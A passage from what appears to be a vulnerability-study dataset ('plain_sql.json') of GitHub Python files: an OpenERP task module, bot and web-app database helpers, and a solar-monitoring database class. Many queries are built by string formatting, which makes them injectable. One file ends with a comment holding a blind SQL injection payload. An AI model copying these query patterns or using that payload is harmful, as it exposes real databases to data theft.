for child in project_ids:\n                self.setActive(cr, uid, [child], value, context)     \t\t\n        return True\nproject()\n\nclass project_task_type(osv.osv):\n    _name = 'project.task.type'\n    _description = 'Project task type'\n    _columns = {\n        'name': fields.char('Type', required=True, size=64, translate=True),\n        'description': fields.text('Description'),\n    }\nproject_task_type()\n\nclass task(osv.osv):\n    _name = \"project.task\"\n    _description = \"Tasks\"\n    _date_name = \"date_start\"\n    def _str_get(self, task, level=0, border='***', context={}):\n        return border+' '+(task.user_id and task.user_id.name.upper() or '')+(level and (': L'+str(level)) or '')+(' - %.1fh / %.1fh'%(task.effective_hours or 0.0,task.planned_hours))+' '+border+'\\n'+ \\\n            border[0]+' '+(task.name or '')+'\\n'+ \\\n            (task.description or '')+'\\n\\n'\n\n    def _history_get(self, cr, uid, ids, name, args, context={}):\n        result = {}\n        for task in self.browse(cr, uid, ids, context=context):\n            result[task.id] = self._str_get(task, border='===')\n            t2 = task.parent_id\n            level = 0\n            while t2:\n                level -= 1\n                result[task.id] = self._str_get(t2, level) + result[task.id]\n                t2 = t2.parent_id\n            t3 = map(lambda x: (x,1), task.child_ids)\n            while t3:\n                t2 = t3.pop(0)\n                result[task.id] = result[task.id] + self._str_get(t2[0], t2[1])\n                t3 += map(lambda x: (x,t2[1]+1), t2[0].child_ids)\n        return result\n\n# Compute: effective_hours, total_hours, progress\n    def _hours_get(self, cr, uid, ids, field_names, args, context):\n        cr.execute(\"SELECT task_id, COALESCE(SUM(hours),0) FROM project_task_work WHERE task_id in %s GROUP BY task_id\", (tuple(ids),))\n        hours = dict(cr.fetchall())\n        res = {}\n        for task in self.browse(cr, uid, ids, context=context):\n            res[task.id] = {}\n            res[task.id]['effective_hours'] = hours.get(task.id, 0.0)\n            res[task.id]['total_hours'] = task.remaining_hours + hours.get(task.id, 0.0)\n            if (task.remaining_hours + hours.get(task.id, 0.0)):\n                res[task.id]['progress'] = round(min(100.0 * hours.get(task.id, 0.0) / res[task.id]['total_hours'], 100),2)\n            else:\n                res[task.id]['progress'] = 0.0\n            res[task.id]['delay_hours'] = res[task.id]['total_hours'] - task.planned_hours\n        return res\n\n    def onchange_planned(self, cr, uid, ids, planned, effective=0.0):\n        return {'value':{'remaining_hours': planned-effective}}\n\n    def _default_project(self, cr, uid, context={}):\n        if 'project_id' in context and context['project_id']:\n            return context['project_id']\n        return False\n\n    #_sql_constraints = [\n    #    ('remaining_hours', 'CHECK (remaining_hours>=0)', 'Please increase and review remaining hours ! It can not be smaller than 0.'),\n    #]\n    \n    def copy_data(self, cr, uid, id, default={},context={}):\n        default = default or {}\n        default['work_ids'] = []\n        return super(task, self).copy_data(cr, uid, id, default, context)\n\n    _columns = {\n        'active': fields.boolean('Active'),\n        'name': fields.char('Task summary', size=128, required=True),\n        'description': fields.text('Description'),\n        'priority' : fields.selection([('4','Very Low'), ('3','Low'), ('2','Medium'), ('1','Urgent'), ('0','Very urgent')], 'Importance'),\n        'sequence': fields.integer('Sequence'),\n        'type': fields.many2one('project.task.type', 'Type'),\n        'state': fields.selection([('draft', 'Draft'),('open', 'In Progress'),('pending', 'Pending'), ('cancelled', 'Cancelled'), ('done', 'Done')], 'Status', readonly=True, required=True),\n        'date_start': fields.datetime('Starting Date'),\n        'date_deadline': fields.datetime('Deadline'),\n        'date_close': fields.datetime('Date Closed', readonly=True),\n        'project_id': fields.many2one('project.project', 'Project', ondelete='cascade',\n            help=\"If you have [?] in the project name, it means there are no analytic account linked to this project.\"),\n        'parent_id': fields.many2one('project.task', 'Parent Task'),\n        'child_ids': fields.one2many('project.task', 'parent_id', 'Delegated Tasks'),\n        'history': fields.function(_history_get, method=True, string=\"Task Details\", type=\"text\"),\n        'notes': fields.text('Notes'),\n\n        'planned_hours': fields.float('Planned Hours', required=True, help='Estimated time to do the task, usually set by the project manager when the task is in draft state.'),\n        'effective_hours': fields.function(_hours_get, method=True, string='Hours Spent', multi='hours', store=True, help=\"Computed using the sum of the task work done.\"),\n        'remaining_hours': fields.float('Remaining Hours', digits=(16,4), help=\"Total remaining time, can be re-estimated periodically by the assignee of the task.\"),\n        'total_hours': fields.function(_hours_get, method=True, string='Total Hours', multi='hours', store=True, help=\"Computed as: Time Spent + Remaining Time.\"),\n        'progress': fields.function(_hours_get, method=True, string='Progress (%)', multi='hours', store=True, help=\"Computed as: Time Spent / Total Time.\"),\n        'delay_hours': fields.function(_hours_get, method=True, string='Delay Hours', multi='hours', store=True, help=\"Computed as: Total Time - Estimated Time. It gives the difference of the time estimated by the project manager and the real time to close the task.\"),\n\n        'user_id': fields.many2one('res.users', 'Assigned to'),\n        'delegated_user_id': fields.related('child_ids','user_id',type='many2one', relation='res.users', string='Delegated To'),\n        'partner_id': fields.many2one('res.partner', 'Partner'),\n        'work_ids': fields.one2many('project.task.work', 'task_id', 'Work done'),\n    }\n    _defaults = {\n        'user_id': lambda obj,cr,uid,context: uid,\n        'state': lambda *a: 'draft',\n        'priority': lambda *a: '2',\n        'progress': lambda *a: 0,\n        'sequence': lambda *a: 10,\n        'active': lambda *a: True,\n        'date_start': lambda *a: time.strftime('%Y-%m-%d %H:%M:%S'),\n        'project_id': _default_project,\n    }\n    _order = \"sequence, priority, date_deadline, id\"\n\n    #\n    # Override view according to the company definition\n    #\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False):\n        tm = self.pool.get('res.users').browse(cr, uid, uid, context).company_id.project_time_mode or False\n        f = self.pool.get('res.company').fields_get(cr, uid, ['project_time_mode'], context)\n        word = 'Hours'\n        if tm:\n            word = dict(f['project_time_mode']['selection'])[tm]\n\n        res = super(task, self).fields_view_get(cr, uid, view_id, view_type, context, toolbar)\n        if (not tm) or (tm=='hours'):\n            return res\n        eview = etree.fromstring(res['arch'])\n        def _check_rec(eview, tm):\n            if eview.attrib.get('widget',False) == 'float_time':\n                eview.set('widget','float')\n            for child in eview:\n                _check_rec(child, tm)\n            return True\n        _check_rec(eview, tm)\n        res['arch'] = etree.tostring(eview)\n        for f in res['fields']:\n            if 'Hours' in res['fields'][f]['string']:\n                res['fields'][f]['string'] = res['fields'][f]['string'].replace('Hours',word)\n        return res\n\n    def do_close(self, cr, uid, ids, *args):\n        request = self.pool.get('res.request')\n        tasks = self.browse(cr, uid, ids)\n        for task in tasks:\n            project = task.project_id\n            if project:\n                if project.warn_manager and project.manager and (project.manager.id != uid):\n                    request.create(cr, uid, {\n                        'name': _(\"Task '%s' closed\") % task.name,\n                        'state': 'waiting',\n                        'act_from': uid,\n                        'act_to': project.manager.id,\n                        'ref_partner_id': task.partner_id.id,\n                        'ref_doc1': 'project.task,%d'% (task.id,),\n                        'ref_doc2': 'project.project,%d'% (project.id,),\n                    })\n            self.write(cr, uid, [task.id], {'state': 'done', 'date_close':time.strftime('%Y-%m-%d %H:%M:%S'), 'remaining_hours': 0.0})\n            if task.parent_id and task.parent_id.state in ('pending','draft'):\n                reopen = True\n                for child in task.parent_id.child_ids:\n                    if child.id != task.id and child.state not in ('done','cancelled'):\n                        reopen = False\n                if reopen:\n                    self.do_reopen(cr, uid, [task.parent_id.id])\n        return True\n\n    def do_reopen(self, cr, uid, ids, *args):\n        request = self.pool.get('res.request')\n        tasks = self.browse(cr, uid, ids)\n        for task in tasks:\n            project = task.project_id\n            if project and project.warn_manager and project.manager.id and (project.manager.id != uid):\n                request.create(cr, uid, {\n                    'name': _(\"Task '%s' set in progress\") % task.name,\n                    'state': 'waiting',\n                    'act_from': uid,\n                    'act_to': project.manager.id,\n                    'ref_partner_id': task.partner_id.id,\n                    'ref_doc1': 'project.task,%d' % task.id,\n                    'ref_doc2': 'project.project,%d' % project.id,\n                })\n\n            self.write(cr, uid, [task.id], {'state': 'open'})\n        return True\n\n    def do_cancel(self, cr, uid, ids, *args):\n        request = self.pool.get('res.request')\n        tasks = self.browse(cr, uid, ids)\n        for task in tasks:\n            project = task.project_id\n            if project.warn_manager and project.manager and (project.manager.id != uid):\n                request.create(cr, uid, {\n                    'name': _(\"Task '%s' cancelled\") % task.name,\n                    'state': 'waiting',\n                    'act_from': uid,\n                    'act_to': project.manager.id,\n                    'ref_partner_id': task.partner_id.id,\n                    'ref_doc1': 'project.task,%d' % task.id,\n                    'ref_doc2': 'project.project,%d' % project.id,\n                })\n            self.write(cr, uid, [task.id], {'state': 'cancelled', 'remaining_hours':0.0})\n        return True\n\n    def do_open(self, cr, uid, ids, *args):\n        tasks= self.browse(cr,uid,ids)\n        for t in tasks:\n            self.write(cr, uid, [t.id], {'state': 'open'})\n        return True\n\n    def do_draft(self, cr, uid, ids, *args):\n        self.write(cr, uid, ids, {'state': 'draft'})\n        return True\n\n\n    def do_pending(self, cr, uid, ids, *args):\n        self.write(cr, uid, ids, {'state': 'pending'})\n        return True\n\n\ntask()\n\nclass project_work(osv.osv):\n    _name = \"project.task.work\"\n    _description = \"Task Work\"\n    _columns = {\n        'name': fields.char('Work summary', size=128),\n        'date': fields.datetime('Date'),\n        'task_id': fields.many2one('project.task', 'Task', ondelete='cascade', required=True),\n        'hours': fields.float('Time Spent'),\n        'user_id': fields.many2one('res.users', 'Done by', required=True),\n    }\n    _defaults = {\n        'user_id': lambda obj,cr,uid,context: uid,\n        'date': lambda *a: time.strftime('%Y-%m-%d %H:%M:%S')\n    }\n    _order = \"date desc\"\n    def create(self, cr, uid, vals, *args, **kwargs):\n        if 'hours' in vals and (not vals['hours']):\n            vals['hours'] = 0.00\n        if 'task_id' in vals:\n            cr.execute('update project_task set remaining_hours=remaining_hours - %s where id=%s', (vals.get('hours',0.0), vals['task_id']))\n        return super(project_work,self).create(cr, uid, vals, *args, **kwargs)\n\n    def write(self, cr, uid, ids,vals,context={}):\n        if 'hours' in vals and (not vals['hours']):\n            vals['hours'] = 0.00\n        if 'hours' in vals:\n            for work in self.browse(cr, uid, ids, context):\n                cr.execute('update project_task set remaining_hours=remaining_hours - %s + (%s) where id=%s', (vals.get('hours',0.0), work.hours, work.task_id.id))\n        return super(project_work,self).write(cr, uid, ids, vals, context)\n\n    def unlink(self, cr, uid, ids, *args, **kwargs):\n        for work in self.browse(cr, uid, ids):\n            cr.execute('update project_task set remaining_hours=remaining_hours + %s where id=%s', (work.hours, work.task_id.id))\n        return super(project_work,self).unlink(cr, uid, ids,*args, **kwargs)\nproject_work()\n\nclass config_compute_remaining(osv.osv_memory):\n    _name='config.compute.remaining'\n    def _get_remaining(self,cr, uid, ctx):\n        if 'active_id' in ctx:\n            return self.pool.get('project.task').browse(cr,uid,ctx['active_id']).remaining_hours\n        return False\n\n    _columns = {\n        'remaining_hours' : fields.float('Remaining Hours', digits=(16,2), help=\"Total remaining time, can be re-estimated periodically by the assignee of the task.\"),\n            }\n\n    _defaults = {\n        'remaining_hours': _get_remaining\n        }\n    \n    def compute_hours(self, cr, uid, ids, context=None):\n        if 'active_id' in context:\n            remaining_hrs=self.browse(cr,uid,ids)[0].remaining_hours\n            self.pool.get('project.task').write(cr,uid,context['active_id'],{'remaining_hours':remaining_hrs})\n        return {\n                'type': 'ir.actions.act_window_close',\n         }\nconfig_compute_remaining()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/startsevdev/cashbox_bot/blob/311852a0f787bdb1238b621b6fcd96880815d40f",
        "file_path": "/parser.py",
        "source": "import re\nfrom db import Database\nfrom csv_generator import CSVGenerator\n\n\nclass Parser(object):\n    def __init__(self):\n        self.db = Database(\"/Users/alexander/code/bots/CashboxBot/data.db\")\n        self.csv_generator = CSVGenerator()\n\n    def parse_message(self, string):\n        string = string.lower()\n        date = self.search_date(string)\n\n        if \"\" in string:\n            return self.parse_revenue_message(string, date)\n        elif \"\" in string or \"\" in string:\n            return self.parse_report_message(string, date)\n        # sql-injection protection\n        elif string == \"'\":\n            return \"!     .   .\"\n        else:\n            return self.db.add_sale(string.capitalize())\n\n    def search_date(self, string):\n        search_date_result = re.search(\"\\d{2}.\\d{2}.\\d{4}\", string)\n        if search_date_result:\n            date = search_date_result.group()\n            return date\n\n    def parse_revenue_message(self, string, date):\n        if date and self.db.check_date(date):\n            return self.db.revenue(date)\n        elif date:\n            return \"    .\"\n        elif string == \"\":\n            return self.db.revenue()\n        else:\n            return \"!   .\"\n\n    def parse_report_message(self, string, date):\n        if date and self.db.check_date(date):\n            return self.csv_generator.write_csv(date)\n        elif date:\n            return \"    .\"\n        elif string == \"\" or string == \"\":\n            return self.csv_generator.write_csv()\n        else:\n            return \"!   .\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/martinMutuma/def-politico/blob/76f13f48d622e0d4261ad239731275c3d5bfda5d",
        "file_path": "/app/v2/models/base_model.py",
        "source": "from app.v1.utils.validator import validate_ints\nfrom app.v2.db.database_config import Database\n\n\nclass BaseModel(Database):\n    \"\"\" model that defines all models \"\"\"\n\n    def __init__(self, object_name, table_name):\n        self.table_name = table_name\n        self.object_name = object_name\n        self.error_message = \"\"\n        self.error_code = 200\n\n    def as_json(self):\n        pass\n\n    def params_to_values(self, params):\n        f = [\"'{}'\".format(self.escapedString(i)) for i in params]\n        return \", \".join(f)\n\n    def escapedString(self, value):\n        if isinstance(value, str):\n            return value.replace(\"'\", \"''\")\n        return value\n\n    def save(self, fields, *values):\n        \"\"\" save the object to table \"\"\"\n\n        query = \"INSERT INTO {} ({}) \\\n        VALUES ({}) RETURNING *\".format(\n            self.table_name, fields, self.params_to_values(values)\n        )\n        print(query)\n        return super().insert(query)\n\n    def edit(self, key, value, id):\n        \"\"\" edits a certain column of a table \"\"\"\n\n        query = \"UPDATE {} SET {} = '{}' WHERE id = '{}' \\\n            RETURNING *\".format(\n                self.table_name, key, self.escapedString(value), id)\n\n        return self.insert(query)\n\n    def load_all(self):\n        \"\"\"  Get all items in table \"\"\"\n\n        query = \"SELECT * FROM {}\".format(self.table_name)\n\n        return self.get_all(query)\n\n    def delete(self, id):\n        \"\"\" Remove item from table \"\"\"\n\n        query = \"DELETE FROM {} WHERE id = {}\".format(self.table_name, id)\n\n        self.execute(query)\n\n    def validate_object(self):\n        \"\"\"This function validates an object and rejects or accepts it\"\"\"\n\n        return True\n\n    def find_by(self, key, value):\n        \"\"\" Find object from table and return \"\"\"\n\n        query = \"SELECT * FROM {} WHERE {} = '{}'\".format(\n            self.table_name, key, self.escapedString(value))\n\n        data = self.get_one(query)\n        if data:\n            data[key] = value\n        return data\n    \n    def update_find_by(self, key, value,id):\n        \"\"\" Find object from table and return \"\"\"\n\n        query = \"SELECT * FROM {} WHERE {} = '{}' AND id != {}\".format(\n            self.table_name, key, self.escapedString(value),id)\n\n        data = self.get_one(query)\n        if data:\n            data[key] = value\n        return data\n\n    def find_all_by(self, key, value):\n        \"\"\" Find objects from table and return \"\"\"\n\n        query = \"SELECT * FROM {} WHERE {} = '{}'\".format(\n            self.table_name, key, self.escapedString(value))\n\n        data = self.get_all(query)\n        return data\n\n    def from_json(self, json):\n        return self\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/martinMutuma/def-politico/blob/d2a1ef09e042eda44b5005a0ba3eef462eee34a6",
        "file_path": "/app/v2/models/base_model.py",
        "source": "from app.v1.utils.validator import validate_ints\nfrom app.v2.db.database_config import Database\n\n\nclass BaseModel(Database):\n    \"\"\" model that defines all models \"\"\"\n\n    def __init__(self, object_name, table_name):\n        self.table_name = table_name\n        self.object_name = object_name\n        self.error_message = \"\"\n        self.error_code = 200\n\n    def as_json(self):\n        pass\n\n    def params_to_values(self, params):\n        f = [\"'{}'\".format(self.escapedString(i)) for i in params]\n        return \", \".join(f)\n\n    def escapedString(self, value):\n        if isinstance(value, str):\n            return value.replace(\"'\", \"''\")\n        return value\n\n    def save(self, fields, *values):\n        \"\"\" save the object to table \"\"\"\n\n        query = \"INSERT INTO {} ({}) \\\n        VALUES ({}) RETURNING *\".format(\n            self.table_name, fields, self.params_to_values(values)\n        )\n        print(query)\n        return super().insert(query)\n\n    def edit(self, key, value, id):\n        \"\"\" edits a certain column of a table \"\"\"\n\n        query = \"UPDATE {} SET {} = '{}' WHERE id = '{}' \\\n            RETURNING *\".format(\n                self.table_name, key, self.escapedString(value), id)\n\n        return self.insert(query)\n\n    def load_all(self):\n        \"\"\"  Get all items in table \"\"\"\n\n        query = \"SELECT * FROM {}\".format(self.table_name)\n\n        return self.get_all(query)\n\n    def delete(self, id):\n        \"\"\" Remove item from table \"\"\"\n\n        query = \"DELETE FROM {} WHERE id = {}\".format(self.table_name, id)\n\n        self.execute(query)\n\n    def validate_object(self):\n        \"\"\"This function validates an object and rejects or accepts it\"\"\"\n\n        return True\n\n    def find_by(self, key, value):\n        \"\"\" Find object from table and return \"\"\"\n\n        query = \"SELECT * FROM {} WHERE {} = '{}'\".format(\n            self.table_name, key, self.escapedString(value))\n\n        data = self.get_one(query)\n        if data:\n            data[key] = value\n        return data\n    \n    def update_find_by(self, key, value,id):\n        \"\"\" Find object from table and return \"\"\"\n\n        query = \"SELECT * FROM {} WHERE {} = '{}' AND id != {}\"\n        query=query.format(self.table_name, key, self.escapedString(value),id)\n    \n        data = self.get_one(query)\n        if data:\n            data[key] = value\n        return data\n\n    def find_all_by(self, key, value):\n        \"\"\" Find objects from table and return \"\"\"\n\n        query = \"SELECT * FROM {} WHERE {} = '{}'\".format(\n            self.table_name, key, self.escapedString(value))\n\n        data = self.get_all(query)\n        return data\n\n    def from_json(self, json):\n        return self\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/philipptrenz/sunportal/blob/f556bf3ee62d3c701042707043126437c929f31e",
        "file_path": "/util/database.py",
        "source": "#!/usr/bin/python3\n\"\"\"\n\"\"\"\nimport pytz\nimport sqlite3\nfrom datetime import datetime, timedelta\n\n\nclass Database():\n\n    def __init__(self, config):\n        self.config = config\n        self.co2_mult = self.config.get_co2_avoidance_factor()\n        self.db = sqlite3.connect(self.config.get_database_path(), check_same_thread=False)\n        self.c = self.db.cursor()\n\n        self.local_timezone = self.get_local_timezone()\n\n    def get(self, date):\n        data = dict()\n        data['today'] = self.get_today()\n        data['requested'] = self.get_requested(date)\n        return data\n\n    def get_today(self):\n\n        data = dict()\n        total_day = 0\n        total = 0\n        co2 = 0\n\n        data['inverters'] = dict()\n        inverters = self.get_inverters()\n        for inv in inverters:\n\n            inv_co2 = 0\n            if inv['etotal'] is not None:\n                inv_co2 = round(inv['etotal'] / 1000 * self.co2_mult)\n\n            data['inverters'][inv['serial']] = {\n                'serial': inv['serial'],\n                'name': inv['name'],\n                'lastUpdated': inv['ts'],\n                'dayTotal': inv['etoday'],\n                'total': inv['etotal'],\n                'status': inv['status'],\n                'co2': inv_co2\n            }\n\n            if inv['etoday'] is not None: total_day += inv['etoday']\n            if inv['etotal'] is not None: total += inv['etotal']\n            co2 += inv_co2\n\n        data['dayTotal'] = total_day\n        data['total'] = total\n        data['co2'] = co2\n\n        return data\n\n    def get_requested(self, date):\n\n        data = dict()\n        data['date'] = date\n\n        data['all'] = dict()\n        data['all']['day'] = self.get_requested_day(date)\n        data['all']['month'] = self.get_requested_month(date)\n\n        data['inverters'] = dict()\n\n        inverters = self.get_inverters()\n        for inv in inverters:\n            data['inverters'][inv['serial']] = { 'day': [], 'month': [] }\n\n            data['inverters'][inv['serial']]['day'] = self.get_requested_day_for_inverter(inv['serial'], date)\n            data['inverters'][inv['serial']]['month'] = self.get_requested_month_for_inverter(inv['serial'], date)\n\n        return data\n\n    def get_requested_day(self, date):\n\n        data = dict()\n\n        day_start, day_end = self.get_epoch_day(date)\n        data['interval'] = {'from': self.convert_local_ts_to_utc(day_start, self.local_timezone), 'to': self.convert_local_ts_to_utc(day_end, self.local_timezone)}\n\n        query = '''\n            SELECT TimeStamp, SUM(Power) AS Power \n            FROM DayData \n            WHERE TimeStamp BETWEEN %s AND %s \n            GROUP BY TimeStamp;\n        '''\n\n        data['data'] = list()\n        for row in self.c.execute(query % (day_start, day_end)):\n            data['data'].append({ 'time': row[0], 'power': row[1] })\n\n\n        if self.get_datetime(date).date() == datetime.today().date():\n            query = '''\n                SELECT SUM(EToday) as EToday\n                FROM Inverters;\n                '''\n        else:\n            query = '''\n                SELECT SUM(DayYield) AS Power \n                FROM MonthData \n                WHERE TimeStamp BETWEEN %s AND %s\n                GROUP BY TimeStamp\n                ''' % (day_start, day_end)\n        self.c.execute(query)\n        row = self.c.fetchone()\n        if row and row[0]: data['total'] = row[0]\n        else: data['total'] = 0\n\n\n        query = '''\n            SELECT MIN(TimeStamp) as Min, MAX(TimeStamp) as Max \n            FROM ( SELECT TimeStamp FROM DayData GROUP BY TimeStamp );\n            '''\n\n        self.c.execute(query)\n        first_data, last_data = self.c.fetchone()\n\n        if (first_data):  data['hasPrevious'] = (first_data < day_start)\n        else: data['hasPrevious'] = False\n\n        if (last_data): data['hasNext'] = (last_data > day_end)\n        else: data['hasNext'] = False\n\n        #print(json.dumps(data, indent=4))\n        return data\n\n    def get_requested_day_for_inverter(self, inverter_serial, date):\n        data = dict()\n\n        day_start, day_end = self.get_epoch_day(date)\n        data['interval'] = {'from': self.convert_local_ts_to_utc(day_start, self.local_timezone), 'to': self.convert_local_ts_to_utc(day_end, self.local_timezone)}\n\n        query = '''\n            SELECT TimeStamp, Power \n            FROM DayData \n            WHERE TimeStamp BETWEEN %s AND %s AND Serial = %s;\n            '''\n\n        data['data'] = list()\n        for row in self.c.execute(query % (day_start, day_end, inverter_serial)):\n            data['data'].append({'time': row[0], 'power': row[1]})\n\n        if self.get_datetime(date).date() == datetime.today().date():\n            query = '''\n                SELECT EToday\n                FROM Inverters\n                WHERE Serial = %s;\n                ''' % inverter_serial\n        else:\n            query = '''\n                SELECT DayYield AS Power \n                FROM MonthData \n                WHERE TimeStamp BETWEEN %s AND %s AND Serial = %s\n                ''' % (day_start, day_end, inverter_serial)\n        self.c.execute(query)\n        res = self.c.fetchone()\n        if res and res[0]:\n            data['total'] = res[0]\n        else:\n            data['total'] = 0\n\n        query = '''\n            SELECT MIN(TimeStamp) as Min, MAX(TimeStamp) as Max \n            FROM ( SELECT TimeStamp FROM DayData WHERE Serial = %s );\n            ''' % inverter_serial\n\n        self.c.execute(query)\n        first_data, last_data = self.c.fetchone()\n\n        if (first_data): data['hasPrevious'] = (first_data < day_start)\n        else: data['hasPrevious'] = False\n\n        if (last_data): data['hasNext'] = (last_data > day_end)\n        else: data['hasNext'] = False\n\n        # print(json.dumps(data, indent=4))\n        return data\n\n    def get_requested_month(self, date):\n        data = dict()\n\n        month_start, month_end = self.get_epoch_month(date)\n        data['interval'] = {'from': self.convert_local_ts_to_utc(month_start, self.local_timezone), 'to': self.convert_local_ts_to_utc(month_end, self.local_timezone)}\n        month_total = 0\n\n        query = '''\n            SELECT TimeStamp, SUM(DayYield) AS Power \n            FROM MonthData \n            WHERE TimeStamp BETWEEN %s AND %s\n            GROUP BY TimeStamp\n            '''\n\n        data['data'] = list()\n        for row in self.c.execute(query % (month_start, month_end)):\n            data['data'].append({'time': self.convert_local_ts_to_utc(row[0], self.local_timezone), 'power': row[1]})\n            month_total += row[1]\n\n        data['total'] = month_total\n\n        query = '''\n            SELECT MIN(TimeStamp) as Min, MAX(TimeStamp) as Max \n            FROM ( SELECT TimeStamp FROM MonthData GROUP BY TimeStamp );\n            '''\n\n        self.c.execute(query)\n        first_data, last_data = self.c.fetchone()\n\n        if first_data: data['hasPrevious'] = (first_data < month_start)\n        else: data['hasPrevious'] = False\n        if last_data: data['hasNext'] = (last_data > month_end)\n        else: data['hasNext'] = False\n\n        return data\n\n    def get_requested_month_for_inverter(self, inverter_serial, date):\n        data = dict()\n\n        month_start, month_end = self.get_epoch_month(date)\n        data['interval'] = {'from': self.convert_local_ts_to_utc(month_start, self.local_timezone), 'to': self.convert_local_ts_to_utc(month_end, self.local_timezone)}\n        month_total = 0\n\n        query = '''\n            SELECT TimeStamp, DayYield AS Power \n            FROM MonthData \n            WHERE TimeStamp BETWEEN %s AND %s AND Serial = %s\n            '''\n\n        data['data'] = list()\n        for row in self.c.execute(query % (month_start, month_end, inverter_serial)):\n            data['data'].append({'time': self.convert_local_ts_to_utc(row[0], self.local_timezone), 'power': row[1]})\n            month_total += row[1]\n\n        data['total'] = month_total\n\n        query = '''\n            SELECT MIN(TimeStamp) as Min, MAX(TimeStamp) as Max \n            FROM MonthData \n            WHERE Serial = %s;\n            ''' % inverter_serial\n\n        self.c.execute(query)\n        first_data, last_data = self.c.fetchone()\n\n        if first_data: data['hasPrevious'] = (first_data < month_start)\n        else: data['hasPrevious'] = False\n        if last_data: data['hasNext'] = (last_data > month_end)\n        else: data['hasNext'] = False\n\n        return data\n\n    def get_inverters(self):\n        query = '''\n            SELECT Serial, Name, Type, TimeStamp, EToday, ETotal, Status, OperatingTime\n            FROM Inverters;\n            '''\n        invs = []\n        renamings = self.config.get_renamings()\n        for row in self.c.execute(query):\n            serial = str(row[0])\n            name = row[1]\n            if serial in renamings.keys():\n                name = renamings[serial]\n\n            invs.append( {\n                'serial': serial,\n                'name': name,\n                'type': row[2],\n                'ts': row[3],\n                'etoday': row[4],\n                'etotal': row[5],\n                'status': row[6]\n            } )\n        return invs\n\n    def get_local_timezone(self):\n        return datetime.now(tz=pytz.utc).astimezone().tzinfo\n\n    def convert_local_ts_to_utc(self, ts, local_timezone):\n        return int(datetime.utcfromtimestamp(ts).replace(tzinfo=local_timezone).timestamp())\n\n    def get_datetime(self, date):\n        s = date.split('-')\n        return datetime(int(s[0]), int(s[1]), int(s[2]), 00, 00, 00)\n\n    def get_epoch_day(self, date):\n        s = date.split('-')\n        epoch_start =  int(datetime(int(s[0]), int(s[1]), int(s[2]), 00, 00, 00, tzinfo=pytz.utc).timestamp())\n        epoch_end =  int(datetime(int(s[0]), int(s[1]), int(s[2]), 23, 59, 59, tzinfo=pytz.utc).timestamp())\n        return epoch_start, epoch_end\n\n    def get_epoch_month(self, date):\n        s = date.split('-')\n        epoch_start = int(datetime(int(s[0]), int(s[1]), 1, 00, 00, 00, tzinfo=pytz.utc).timestamp())\n        epoch_end = int(datetime(int(s[0]), int(s[1]), self.get_last_day_of_month(date), 23, 59, 59, tzinfo=pytz.utc).timestamp())\n        return epoch_start, epoch_end\n\n    def get_last_day_of_month(self, date):\n        day = datetime.strptime(date, \"%Y-%m-%d\")\n        next_month = day.replace(day=28) + timedelta(days=4)  # this will never fail\n        return (next_month - timedelta(days=next_month.day)).day\n\n    def close(self):\n        self.db.close()\n\nif __name__ == '__main__':\n\n    print(\"nothing to do here\")\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/lzhengem/fullstack-nanodegree-vm/blob/6b91fe6f267324e6f103da04eea05b1b8cd91628",
        "file_path": "/vagrant/forum/forumdb.py",
        "source": "# \"Database code\" for the DB Forum.\n\nimport datetime\n\nPOSTS = [(\"This is the first post.\", datetime.datetime.now())]\n\ndef get_posts():\n  \"\"\"Return all posts from the 'database', most recent first.\"\"\"\n  return reversed(POSTS)\n\ndef add_post(content):\n  \"\"\"Add a post to the 'database' with the current timestamp.\"\"\"\n  POSTS.append((content, datetime.datetime.now()))\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Briskwind/Collector/blob/d3215338dc9f7b7398a6b702369282b948348457",
        "file_path": "/server/extensions/sqlite_conn.py",
        "source": "import sqlite3\n\nimport os\n\nfrom server.settings import BASE_DIR\n\nDB_FILE = os.path.join(BASE_DIR, 'db.sqlite3')\n\n\ndef sqlite_executor(sql):\n    conn = sqlite3.connect(DB_FILE)\n\n    sql = 'select * from django_migrations;'\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    res = cursor.fetchall()\n    return res\n\n\ndef get_one_user(user_id):\n    \"\"\" sql \"\"\"\n    conn = sqlite3.connect(DB_FILE)\n\n    sql = 'select * from home_user WHERE id={};'.format(user_id)\n    print('sql', sql)\n    cursor = conn.cursor()\n    cursor.execute(sql)\n    res = cursor.fetchall()\n    return res\n# sql select * from home_user WHERE id=2 AND SUBSTR((SELECT COALESCE(model,' ') FROM django_content_type LIMIT 5,1),7,1)>'l';\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/thugasin/udacity-homework-logAnalyzer/blob/5454de6d0993335abc7df4c6a738b7b12fd8f5b5",
        "file_path": "/logAnalyzerDb.py",
        "source": "#!/usr/bin/env python3\r\nimport psycopg2\r\n\r\nDBNAME = \"news\"\r\n\r\n\r\ndef execute_query(cmd):\r\n    \"\"\" common function for psql query \"\"\"\r\n    conn = psycopg2.connect(database=DBNAME)\r\n    cursor = conn.cursor()\r\n    cursor.execute(cmd)\r\n    result = cursor.fetchall()\r\n    conn.close()\r\n    return result\r\n\r\n\r\ndef get_top_popular(top_num):\r\n    \"\"\" query the top(top_num) popular articles\r\n        top_num => list of [title, count]\r\n    \"\"\"\r\n    cmd = \"\"\"SELECT title, views FROM articles\r\n             INNER JOIN (\r\n             SELECT path, count(path) AS views\r\n             FROM log GROUP BY log.path\r\n             ) AS log\r\n             ON log.path = '/article/' || articles.slug\r\n             ORDER BY views DESC\r\n             LIMIT {}\"\"\".format(top_num)\r\n    return execute_query(cmd)\r\n\r\n\r\ndef get_top_author(top_num):\r\n    \"\"\" query the top(top_num) popular author\r\n        top_num => list of [author, count]\r\n    \"\"\"\r\n    cmd = \"\"\"SELECT authors.name,author_result.num\r\n                    FROM authors JOIN\r\n                    (SELECT SUM(article_result.num) as num,\r\n                    article_result.author\r\n                    from (SELECT articles.title, articles.author,\r\n                    SUM(log.views) AS num\r\n                    FROM articles\r\n                    INNER JOIN (\r\n                    SELECT path, count(path) AS views\r\n                    FROM log GROUP BY log.path\r\n                    ) AS log ON log.path = '/article/'\r\n                    || 